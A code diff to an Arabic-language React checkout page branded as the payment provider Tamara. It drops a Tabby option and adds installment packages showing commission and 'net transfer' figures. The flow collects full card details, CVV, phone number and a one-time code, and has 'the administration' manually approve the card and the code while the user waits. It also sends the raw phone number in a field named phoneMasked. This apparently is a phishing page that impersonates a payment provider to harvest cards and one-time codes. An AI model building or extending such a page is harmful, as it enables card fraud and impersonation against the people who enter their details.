@@ -4,7 +4,7 @@ import { useAuth } from '@/context/AuthContext';
 import Layout from '@/components/Layout';
 import { getProducts } from '@/data/products';
 import { motion, AnimatePresence } from 'framer-motion';
-import { ArrowRight, ShoppingBag, Tag, Check, CreditCard, Phone, ShieldCheck, Lock, ChevronLeft, Loader2, XCircle, AlertCircle } from 'lucide-react';
+import { ArrowRight, ShoppingBag, Check, CreditCard, Phone, ShieldCheck, Lock, ChevronLeft, Loader2, XCircle, AlertCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
@@ -12,8 +12,28 @@ import { toast } from 'sonner';
 import { postCheckoutEvent, requestCardApproval, getCardApprovalStatus, submitVerificationCode, getVerificationResult } from '@/lib/api';
 import { getCheckoutSessionId, clearCheckoutSessionId } from '@/lib/checkoutSession';
 
-type PaymentMethod = 'tamara' | 'tabby' | null;
+type PaymentMethod = 'tamara' | null;
 type Step = 'checkout' | 'confirm-method' | 'verify-phone' | 'card-info' | 'card-approval' | 'confirm-code' | 'verifying-code' | 'success' | 'cancelled' | 'verification-failed';
+
+interface InstallmentPackage {
+  totalAmount: number;
+  installmentsCount: number;
+  perInstallment: number;
+  commission: number;
+  netTransfer: number;
+}
+
+const INSTALLMENT_PACKAGES: InstallmentPackage[] = [
+  { totalAmount: 4140, installmentsCount: 4, perInstallment: 1035, commission: 210, netTransfer: 3930 },
+  { totalAmount: 8280, installmentsCount: 4, perInstallment: 2070, commission: 410, netTransfer: 7870 },
+  { totalAmount: 20700, installmentsCount: 4, perInstallment: 5175, commission: 1040, netTransfer: 19660 },
+  { totalAmount: 6210, installmentsCount: 6, perInstallment: 1035, commission: 310, netTransfer: 5900 },
+  { totalAmount: 12420, installmentsCount: 6, perInstallment: 2070, commission: 620, netTransfer: 11800 },
+  { totalAmount: 31050, installmentsCount: 6, perInstallment: 5175, commission: 1550, netTransfer: 29500 },
+  { totalAmount: 50000, installmentsCount: 12, perInstallment: 4166, commission: 1800, netTransfer: 48200 },
+  { totalAmount: 24000, installmentsCount: 24, perInstallment: 1000, commission: 600, netTransfer: 23400 },
+  { totalAmount: 100000, installmentsCount: 36, perInstallment: 2777, commission: 2200, netTransfer: 97800 },
+];
 
 const Checkout = () => {
   const { id } = useParams();
@@ -25,17 +45,15 @@ const Checkout = () => {
   const [coupon, setCoupon] = useState('');
   const [couponApplied, setCouponApplied] = useState(false);
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>(null);
-  const [installments, setInstallments] = useState(1);
+  const [selectedPackage, setSelectedPackage] = useState<InstallmentPackage | null>(null);
   const [step, setStep] = useState<Step>('checkout');
   const [phoneNumber, setPhoneNumber] = useState('');
-  const [verifyCode, setVerifyCode] = useState('');
   const [cardNumber, setCardNumber] = useState('');
   const [cardExpiry, setCardExpiry] = useState('');
   const [cardCvv, setCardCvv] = useState('');
   const [cardName, setCardName] = useState('');
   const [confirmCode, setConfirmCode] = useState('');
   const [agreedTerms, setAgreedTerms] = useState(false);
-  const [commission] = useState(0);
   const [verificationError, setVerificationError] = useState<string | null>(null);
 
   if (!user) {
@@ -55,18 +73,21 @@ const Checkout = () => {
   }
 
   const formatPrice = (p: number) =>
-    new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);
+    new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 0 }).format(p);
 
   const discount = couponApplied ? product.price * 0.05 : 0;
   const finalPrice = product.price - discount;
-  const perInstallment = finalPrice / installments;
-  const netTransfer = finalPrice - commission;
+
+  const activeInstallments = selectedPackage?.installmentsCount ?? 1;
+  const activePerInstallment = selectedPackage?.perInstallment ?? finalPrice;
+  const activeCommission = selectedPackage?.commission ?? 0;
+  const activeNetTransfer = selectedPackage?.netTransfer ?? finalPrice;
+  const activeTotalAmount = selectedPackage?.totalAmount ?? finalPrice;
+
   const orderId = `ORD-${Date.now().toString(36).toUpperCase()}`;
 
-  // Get session ID (reuses the same session from product selection)
   const sessionId = getCheckoutSessionId();
 
-  // Send checkout_started event when page loads
   useEffect(() => {
     postCheckoutEvent({
       sessionId,
@@ -78,10 +99,8 @@ const Checkout = () => {
       productPrice: product.price,
       amount: finalPrice,
       timestamp: new Date().toISOString(),
-    }).catch(() => {
-      // Silently ignore errors
-    });
-  }, []); // Run once on mount
+    }).catch(() => {});
+  }, []);
 
   const applyCoupon = () => {
     if (coupon.trim().toUpperCase() === 'GOLD5') {
@@ -97,20 +116,21 @@ const Checkout = () => {
       toast.error('يرجى اختيار طريقة الدفع');
       return;
     }
-    // Send payment_method_selected event
+    if (!selectedPackage) {
+      toast.error('يرجى اختيار باقة التقسيط');
+      return;
+    }
     postCheckoutEvent({
       sessionId,
       eventType: 'payment_method_selected',
       userName: user.name,
       userEmail: user.email,
       productName: product.name,
-      amount: finalPrice,
+      amount: activeTotalAmount,
       paymentMethod,
-      installments,
+      installments: activeInstallments,
       timestamp: new Date().toISOString(),
-    }).catch(() => {
-      // Silently ignore errors
-    });
+    }).catch(() => {});
     setStep('confirm-method');
   };
 
@@ -123,7 +143,6 @@ const Checkout = () => {
       toast.error('يرجى الموافقة على الشروط والأحكام');
       return;
     }
-    // Send phone_entered event (backend will mask the phone number)
     postCheckoutEvent({
       sessionId,
       eventType: 'phone_entered',
@@ -131,12 +150,10 @@ const Checkout = () => {
       userEmail: user.email,
       productName: product.name,
       paymentMethod,
-      installments,
+      installments: activeInstallments,
       phoneMasked: phoneNumber,
       timestamp: new Date().toISOString(),
-    }).catch(() => {
-      // Silently ignore errors
-    });
+    }).catch(() => {});
     toast.info('تم إرسال رمز التحقق إلى هاتفك');
     setStep('card-info');
   };
@@ -155,9 +172,9 @@ const Checkout = () => {
         userName: user.name,
         userEmail: user.email,
         productName: product.name,
-        amount: finalPrice,
+        amount: activeTotalAmount,
         paymentMethod,
-        installments,
+        installments: activeInstallments,
         phoneMasked: phoneNumber,
         cardLast4,
         cardExpiry,
@@ -172,7 +189,6 @@ const Checkout = () => {
     }
   };
 
-  // Poll for approval status
   useEffect(() => {
     if (step !== 'card-approval') return;
 
@@ -186,7 +202,6 @@ const Checkout = () => {
           if (pollingInterval) clearInterval(pollingInterval);
           if (timeoutId) clearTimeout(timeoutId);
 
-          // Send phone_confirmed event (no card/CVV data sent)
           postCheckoutEvent({
             sessionId,
             eventType: 'phone_confirmed',
@@ -194,12 +209,10 @@ const Checkout = () => {
             userEmail: user.email,
             productName: product.name,
             paymentMethod,
-            installments,
+            installments: activeInstallments,
             phoneMasked: phoneNumber,
             timestamp: new Date().toISOString(),
-          }).catch(() => {
-            // Silently ignore errors
-          });
+          }).catch(() => {});
 
           setStep('confirm-code');
           toast.success('تمت الموافقة على بيانات البطاقة');
@@ -211,24 +224,20 @@ const Checkout = () => {
           toast.error('تم رفض بيانات البطاقة من قبل الإدارة');
           clearCheckoutSessionId();
         } else if (response.status === 'error') {
-          // Show error message but stay on same step (allow retry)
           if (pollingInterval) clearInterval(pollingInterval);
           if (timeoutId) clearTimeout(timeoutId);
 
           const errorReason = response.reason || 'حدث خطأ غير معروف';
           toast.error(errorReason);
           clearCheckoutSessionId();
-          // Stay on card-approval step but user can retry
         }
       } catch (err) {
         console.error('Error checking approval status:', err);
       }
     };
 
-    // Start polling
     pollingInterval = setInterval(pollStatus, 2000);
 
-    // Set timeout after 5 minutes
     timeoutId = setTimeout(() => {
       if (pollingInterval) clearInterval(pollingInterval);
       setStep('checkout');
@@ -239,9 +248,8 @@ const Checkout = () => {
       if (pollingInterval) clearInterval(pollingInterval);
       if (timeoutId) clearTimeout(timeoutId);
     };
-  }, [step, sessionId, user, product, paymentMethod, installments, phoneNumber]);
+  }, [step, sessionId, user, product, paymentMethod, activeInstallments, phoneNumber]);
 
-  // Poll for verification result
   useEffect(() => {
     if (step !== 'verifying-code') return;
 
@@ -251,36 +259,34 @@ const Checkout = () => {
     const pollStatus = async () => {
       try {
         const response = await getVerificationResult(sessionId);
-        
+
         if (response.status === 'code_correct') {
           if (pollingInterval) clearInterval(pollingInterval);
           if (timeoutId) clearTimeout(timeoutId);
 
-          // Send redirect_to_payment event before completing
           postCheckoutEvent({
             sessionId,
             eventType: 'redirect_to_payment',
             userName: user.name,
             userEmail: user.email,
             productName: product.name,
-            amount: finalPrice,
+            amount: activeTotalAmount,
             paymentMethod,
-            installments,
+            installments: activeInstallments,
             phoneMasked: phoneNumber,
             orderId,
             timestamp: new Date().toISOString(),
           }).catch(() => {});
 
-          // Send checkout_completed event
           postCheckoutEvent({
             sessionId,
             eventType: 'checkout_completed',
             userName: user.name,
             userEmail: user.email,
             productName: product.name,
-            amount: finalPrice,
+            amount: activeTotalAmount,
             paymentMethod,
-            installments,
+            installments: activeInstallments,
             phoneMasked: phoneNumber,
             orderId,
             paymentStatus: 'paid',
@@ -314,10 +320,8 @@ const Checkout = () => {
       }
     };
 
-    // Start polling
     pollingInterval = setInterval(pollStatus, 2000);
 
-    // Set timeout after 5 minutes
     timeoutId = setTimeout(() => {
       if (pollingInterval) clearInterval(pollingInterval);
       setVerificationError('انتهت مهلة التحقق. يرجى المحاولة مرة أخرى.');
@@ -328,7 +332,7 @@ const Checkout = () => {
       if (pollingInterval) clearInterval(pollingInterval);
       if (timeoutId) clearTimeout(timeoutId);
     };
-  }, [step, sessionId, user, product, paymentMethod, installments, phoneNumber, finalPrice, orderId]);
+  }, [step, sessionId, user, product, paymentMethod, activeInstallments, phoneNumber, activeTotalAmount, orderId]);
 
   const handleFinalConfirm = async () => {
     if (!confirmCode || confirmCode.length < 4) {
@@ -341,9 +345,9 @@ const Checkout = () => {
         userName: user.name,
         userEmail: user.email,
         productName: product.name,
-        amount: finalPrice,
+        amount: activeTotalAmount,
         paymentMethod,
-        installments,
+        installments: activeInstallments,
         phoneMasked: phoneNumber,
       });
 
@@ -356,16 +360,23 @@ const Checkout = () => {
     }
   };
 
-  const methodName = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod === 'tabby' ? 'تابي' : '';
+  const packagesByCount = INSTALLMENT_PACKAGES.reduce<Record<number, InstallmentPackage[]>>((acc, pkg) => {
+    if (!acc[pkg.installmentsCount]) acc[pkg.installmentsCount] = [];
+    acc[pkg.installmentsCount].push(pkg);
+    return acc;
+  }, {});
+
+  const installmentGroups = Object.entries(packagesByCount).map(([count, pkgs]) => ({
+    count: Number(count),
+    packages: pkgs,
+  }));
 
   return (
     <Layout>
       <div className="container mx-auto px-4 py-8 max-w-2xl">
         <AnimatePresence mode="wait">
-          {/* Step: Checkout */}
           {step === 'checkout' && (
             <motion.div key="checkout" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
-              {/* Header */}
               <div className="flex items-center justify-between mb-6">
                 <Link to="/" className="inline-flex items-center gap-1 text-sm text-muted-foreground hover:text-primary">
                   <ArrowRight className="h-4 w-4" />
@@ -377,7 +388,6 @@ const Checkout = () => {
                 </div>
               </div>
 
-              {/* User greeting */}
               <div className="bg-card rounded-xl border gold-border p-4 mb-4 flex items-center gap-3">
                 <div className="w-10 h-10 rounded-full gold-gradient flex items-center justify-center text-primary-foreground font-bold text-sm">
                   {user.name.charAt(0)}
@@ -388,7 +398,6 @@ const Checkout = () => {
                 </div>
               </div>
 
-              {/* Product Summary */}
               <div className="bg-card rounded-xl border gold-border p-6 mb-4">
                 <div className="flex justify-between items-center mb-4">
                   <h3 className="font-bold text-foreground">{product.name}</h3>
@@ -411,7 +420,6 @@ const Checkout = () => {
                 </div>
               </div>
 
-              {/* Coupon */}
               <div className="bg-card rounded-xl border gold-border p-5 mb-4">
                 <p className="text-sm text-muted-foreground mb-3">أدخل الكوبون لإتمام الدفع</p>
                 <div className="flex gap-2">
@@ -433,97 +441,108 @@ const Checkout = () => {
                 </div>
               </div>
 
-              {/* Payment Methods */}
               <div className="bg-card rounded-xl border gold-border p-5 mb-4">
                 <h3 className="text-sm font-bold text-foreground mb-4 flex items-center gap-2">
                   <CreditCard className="h-4 w-4 text-primary" />
                   تفاصيل الطلب - الدفع
                 </h3>
 
-                {/* Tabby */}
-                <button
-                  onClick={() => { setPaymentMethod('tabby'); setInstallments(4); }}
-                  className={`w-full p-4 rounded-xl border mb-3 text-right transition-all ${
-                    paymentMethod === 'tabby'
-                      ? 'border-[hsl(160,60%,45%)] bg-[hsl(160,60%,45%,0.08)]'
-                      : 'border-border hover:border-muted-foreground/50'
-                  }`}
-                >
-                  <div className="flex items-center justify-between mb-2" dir="rtl">
-                    <div className="flex items-center gap-2">
-                      <img 
-                        src="/tabby-logo.webp" 
-                        alt="Tabby" 
-                        className="h-6 object-contain"
-                      />
-                      <span className="font-bold text-[hsl(160,60%,45%)] text-lg">Tabby</span>
-                    </div>
-                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'tabby' ? 'border-[hsl(160,60%,45%)]' : 'border-muted-foreground/40'}`}>
-                      {paymentMethod === 'tabby' && <div className="w-3 h-3 rounded-full bg-[hsl(160,60%,45%)]" />}
-                    </div>
-                  </div>
-                  <p className="text-xs text-muted-foreground">قسّم مشترياتك على 4 دفعات بدون فوائد</p>
-                </button>
-
                 {/* Tamara */}
                 <button
-                  onClick={() => { setPaymentMethod('tamara'); setInstallments(1); }}
+                  onClick={() => { setPaymentMethod('tamara'); setSelectedPackage(null); }}
                   className={`w-full p-4 rounded-xl border mb-3 text-right transition-all ${
                     paymentMethod === 'tamara'
                       ? 'border-[hsl(340,80%,55%)] bg-[hsl(340,80%,55%,0.08)]'
                       : 'border-border hover:border-muted-foreground/50'
                   }`}
                 >
-                  <div className="flex items-center justify-between mb-2" dir="rtl">
+                  <div className="flex items-center justify-between" dir="rtl">
                     <div className="flex items-center gap-2">
-                      <img 
-                        src="/tamara-logo.webp" 
-                        alt="Tamara" 
+                      <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'tamara' ? 'border-[hsl(340,80%,55%)]' : 'border-muted-foreground/40'}`}>
+                        {paymentMethod === 'tamara' && <div className="w-3 h-3 rounded-full bg-[hsl(340,80%,55%)]" />}
+                      </div>
+                      <span className="font-bold text-[hsl(340,80%,55%)] text-lg">Tamara</span>
+                      <img
+                        src="/tamara-logo.webp"
+                        alt="Tamara"
                         className="h-6 object-contain"
                       />
-                      <span className="font-bold text-[hsl(340,80%,55%)] text-lg">Tamara</span>
-                    </div>
-                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'tamara' ? 'border-[hsl(340,80%,55%)]' : 'border-muted-foreground/40'}`}>
-                      {paymentMethod === 'tamara' && <div className="w-3 h-3 rounded-full bg-[hsl(340,80%,55%)]" />}
                     </div>
                   </div>
-                  <p className="text-xs text-muted-foreground">تقسيم فاتورتك حتى 12 دفعة بدون فوائد!</p>
+                  <p className="text-xs text-muted-foreground mt-2">تقسيم فاتورتك حتى 36 دفعة بدون فوائد!</p>
                 </button>
 
-                {/* Installment options for tamara */}
+                {/* Installment packages */}
                 {paymentMethod === 'tamara' && (
-                  <div className="bg-secondary rounded-lg p-4 mb-3 space-y-3">
-                    <p className="text-sm font-semibold text-foreground">اختر عدد الأقساط:</p>
-                    <div className="grid grid-cols-4 gap-2">
-                      {[1, 3, 6, 12].map(n => (
-                        <button
-                          key={n}
-                          onClick={() => setInstallments(n)}
-                          className={`py-2 rounded-lg text-sm font-bold transition-all ${
-                            installments === n
-                              ? 'gold-gradient text-primary-foreground'
-                              : 'bg-card border border-border text-muted-foreground hover:border-primary/50'
-                          }`}
-                        >
-                          {n === 1 ? 'كاملة' : `${n} أقساط`}
-                        </button>
-                      ))}
-                    </div>
-                    <div className="text-center text-sm text-muted-foreground mt-2">
-                      <span>كل دفعة: </span>
-                      <span className="text-primary font-bold">{formatPrice(perInstallment)}</span>
-                    </div>
+                  <div className="space-y-4 mt-2">
+                    {installmentGroups.map(({ count, packages }) => (
+                      <div key={count} className="bg-secondary rounded-xl p-4">
+                        <p className="text-sm font-bold text-foreground mb-3">
+                          {count} {count === 1 ? 'دفعة' : 'دفعات'}
+                        </p>
+                        <div className="space-y-2">
+                          {packages.map((pkg, idx) => (
+                            <button
+                              key={idx}
+                              onClick={() => setSelectedPackage(pkg)}
+                              className={`w-full p-3 rounded-lg border text-right transition-all ${
+                                selectedPackage === pkg
+                                  ? 'border-primary bg-primary/10'
+                                  : 'border-border bg-card hover:border-primary/50'
+                              }`}
+                            >
+                              <div className="flex items-center justify-between">
+                                <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${selectedPackage === pkg ? 'border-primary' : 'border-muted-foreground/40'}`}>
+                                  {selectedPackage === pkg && <div className="w-2 h-2 rounded-full bg-primary" />}
+                                </div>
+                                <div className="text-right flex-1 mr-2">
+                                  <span className="font-bold text-foreground">{formatPrice(pkg.totalAmount)}</span>
+                                  <span className="text-muted-foreground text-xs mr-2">
+                                    ({count} × {formatPrice(pkg.perInstallment)})
+                                  </span>
+                                </div>
+                              </div>
+                            </button>
+                          ))}
+                        </div>
+                      </div>
+                    ))}
+
+                    {/* Selected package details */}
+                    {selectedPackage && (
+                      <motion.div
+                        initial={{ opacity: 0, y: -8 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        className="bg-primary/5 border border-primary/30 rounded-xl p-4 space-y-2"
+                      >
+                        <p className="text-sm font-bold text-foreground mb-3">📦 الباقة المختارة:</p>
+                        <div className="space-y-1.5 text-sm">
+                          <div className="flex justify-between">
+                            <span className="font-semibold text-foreground">{formatPrice(selectedPackage.totalAmount)}</span>
+                            <span className="text-muted-foreground">💰 المبلغ الإجمالي</span>
+                          </div>
+                          <div className="flex justify-between">
+                            <span className="font-semibold text-foreground">{selectedPackage.installmentsCount} دفعة</span>
+                            <span className="text-muted-foreground">📆 عدد الدفعات</span>
+                          </div>
+                          <div className="flex justify-between">
+                            <span className="font-semibold text-foreground">{formatPrice(selectedPackage.perInstallment)}</span>
+                            <span className="text-muted-foreground">💳 كل دفعة</span>
+                          </div>
+                          <div className="flex justify-between">
+                            <span className="font-semibold text-foreground">{formatPrice(selectedPackage.commission)}</span>
+                            <span className="text-muted-foreground">⭐ العمولة</span>
+                          </div>
+                          <div className="flex justify-between border-t border-primary/20 pt-2 mt-2">
+                            <span className="font-bold text-primary">{formatPrice(selectedPackage.netTransfer)}</span>
+                            <span className="text-muted-foreground">💰 صافي التحويل</span>
+                          </div>
+                        </div>
+                      </motion.div>
+                    )}
                   </div>
                 )}
 
-                {paymentMethod === 'tabby' && (
-                  <div className="bg-secondary rounded-lg p-4 mb-3">
-                    <p className="text-sm text-muted-foreground">4 دفعات بدون فوائد</p>
-                    <p className="text-primary font-bold mt-1">كل دفعة: {formatPrice(finalPrice / 4)}</p>
-                  </div>
-                )}
-
-                {/* Info badges */}
                 <div className="space-y-2 mt-4">
                   <div className="flex items-center gap-2 text-xs text-muted-foreground">
                     <ShieldCheck className="h-4 w-4 text-green-400" />
@@ -540,7 +559,7 @@ const Checkout = () => {
 
               <Button
                 onClick={handleConfirmPayment}
-                disabled={!paymentMethod}
+                disabled={!paymentMethod || !selectedPackage}
                 className="w-full py-6 text-lg font-bold gold-gradient text-primary-foreground"
               >
                 <Lock className="h-5 w-5 ml-2" />
@@ -549,7 +568,6 @@ const Checkout = () => {
             </motion.div>
           )}
 
-          {/* Step: Confirm Method */}
           {step === 'confirm-method' && (
             <motion.div key="confirm" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
               <button onClick={() => setStep('checkout')} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary mb-6">
@@ -557,33 +575,34 @@ const Checkout = () => {
               </button>
 
               <div className="bg-card rounded-2xl border gold-border p-8 text-center">
-                <div className={`w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center ${paymentMethod === 'tamara' ? 'bg-[hsl(340,80%,55%,0.15)]' : 'bg-[hsl(160,60%,45%,0.15)]'}`}>
-                  <CreditCard className={`h-8 w-8 ${paymentMethod === 'tamara' ? 'text-[hsl(340,80%,55%)]' : 'text-[hsl(160,60%,45%)]'}`} />
+                <div className="w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center bg-[hsl(340,80%,55%,0.15)]">
+                  <CreditCard className="h-8 w-8 text-[hsl(340,80%,55%)]" />
                 </div>
                 <h2 className="text-xl font-bold text-foreground mb-2">تأكيد وسيلة الدفع</h2>
-                <p className="text-2xl font-extrabold mb-6" style={{ color: paymentMethod === 'tamara' ? 'hsl(340,80%,55%)' : 'hsl(160,60%,45%)' }}>
-                  {methodName}
-                </p>
+                <div className="flex items-center justify-center gap-2 mb-6">
+                  <img src="/tamara-logo.webp" alt="Tamara" className="h-7 object-contain" />
+                  <p className="text-2xl font-extrabold text-[hsl(340,80%,55%)]">تمارا</p>
+                </div>
 
                 <div className="bg-secondary rounded-xl p-5 text-right mb-6 space-y-3">
                   <div className="flex justify-between text-sm">
-                    <span className="text-foreground font-medium">{formatPrice(finalPrice)}</span>
-                    <span className="text-muted-foreground">المبلغ</span>
+                    <span className="text-foreground font-medium">{formatPrice(activeTotalAmount)}</span>
+                    <span className="text-muted-foreground">المبلغ الإجمالي</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-foreground font-medium">{installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`}</span>
+                    <span className="text-foreground font-medium">{activeInstallments} دفعة</span>
                     <span className="text-muted-foreground">عدد الدفعات</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-foreground font-medium">{formatPrice(perInstallment)}</span>
+                    <span className="text-foreground font-medium">{formatPrice(activePerInstallment)}</span>
                     <span className="text-muted-foreground">كل دفعة</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-foreground font-medium">{formatPrice(commission)}</span>
+                    <span className="text-foreground font-medium">{formatPrice(activeCommission)}</span>
                     <span className="text-muted-foreground">العمولة</span>
                   </div>
                   <div className="border-t gold-border pt-3 flex justify-between text-sm">
-                    <span className="text-primary font-bold">{formatPrice(netTransfer)}</span>
+                    <span className="text-primary font-bold">{formatPrice(activeNetTransfer)}</span>
                     <span className="text-muted-foreground">صافي التحويل</span>
                   </div>
                 </div>
@@ -609,7 +628,7 @@ const Checkout = () => {
                       onChange={e => setAgreedTerms(e.target.checked)}
                       className="rounded border-border accent-primary"
                     />
-                    أوافق على شروط وأحكام {methodName}
+                    أوافق على شروط وأحكام تمارا
                   </label>
                 </div>
 
@@ -624,7 +643,6 @@ const Checkout = () => {
             </motion.div>
           )}
 
-          {/* Step: Card Info */}
           {step === 'card-info' && (
             <motion.div key="card" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
               <button onClick={() => setStep('confirm-method')} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary mb-6">
@@ -676,7 +694,6 @@ const Checkout = () => {
             </motion.div>
           )}
 
-          {/* Step: Card Approval (waiting) */}
           {step === 'card-approval' && (
             <motion.div key="approval" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
               <div className="bg-card rounded-2xl border gold-border p-10 text-center">
@@ -690,7 +707,6 @@ const Checkout = () => {
             </motion.div>
           )}
 
-          {/* Step: Cancelled */}
           {step === 'cancelled' && (
             <motion.div key="cancelled" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
               <div className="bg-card rounded-2xl border gold-border p-10 text-center">
@@ -708,7 +724,6 @@ const Checkout = () => {
             </motion.div>
           )}
 
-          {/* Step: Confirm Code */}
           {step === 'confirm-code' && (
             <motion.div key="code" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
               <div className="bg-card rounded-2xl border gold-border p-8 text-center">
@@ -736,7 +751,6 @@ const Checkout = () => {
             </motion.div>
           )}
 
-          {/* Step: Verifying Code (waiting for admin) */}
           {step === 'verifying-code' && (
             <motion.div key="verifying" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
               <div className="bg-card rounded-2xl border gold-border p-10 text-center">
@@ -750,7 +764,6 @@ const Checkout = () => {
             </motion.div>
           )}
 
-          {/* Step: Verification Failed */}
           {step === 'verification-failed' && (
             <motion.div key="verification-failed" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
               <div className="bg-card rounded-2xl border gold-border p-10 text-center">
@@ -768,7 +781,6 @@ const Checkout = () => {
             </motion.div>
           )}
 
-          {/* Step: Success */}
           {step === 'success' && (
             <motion.div key="success" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
               <div className="bg-card rounded-2xl border gold-border p-10 text-center">
@@ -788,16 +800,20 @@ const Checkout = () => {
                     <span className="text-muted-foreground">المنتج</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-primary font-bold">{formatPrice(finalPrice)}</span>
-                    <span className="text-muted-foreground">المبلغ</span>
+                    <span className="text-primary font-bold">{formatPrice(activeTotalAmount)}</span>
+                    <span className="text-muted-foreground">المبلغ الإجمالي</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-foreground">{methodName}</span>
+                    <span className="text-foreground">تمارا</span>
                     <span className="text-muted-foreground">طريقة الدفع</span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-foreground">{installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`}</span>
+                    <span className="text-foreground">{activeInstallments} دفعة</span>
                     <span className="text-muted-foreground">الدفعات</span>
+                  </div>
+                  <div className="flex justify-between text-sm">
+                    <span className="text-foreground">{formatPrice(activePerInstallment)}</span>
+                    <span className="text-muted-foreground">كل دفعة</span>
                   </div>
                 </div>
 
